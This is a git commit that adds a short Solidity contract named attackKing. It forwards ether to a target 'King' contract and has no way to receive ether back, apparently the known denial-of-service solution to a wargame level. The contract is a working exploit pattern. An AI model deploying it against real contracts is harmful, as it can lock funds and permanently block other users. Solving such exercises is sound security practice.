f0c4b15623c38a9afecd3a172d756f6a9c7c461b
dimalavrenuk <105659427+dimalavrenuk@users.noreply.github.com>
2026-01-12 19:01:43 +0200

    Update attackKing.sol

--- attackKing.sol
+++ attackKing.sol
@@ -1,1 +1,14 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
 
+interface King {
+}
+
+contract attackKing{
+    King public kingContract;
+    constructor(address _King) payable{
+        kingContract = King(_King);
+        (bool success, ) = _King.call{value: msg.value}("");
+    }
+
+}
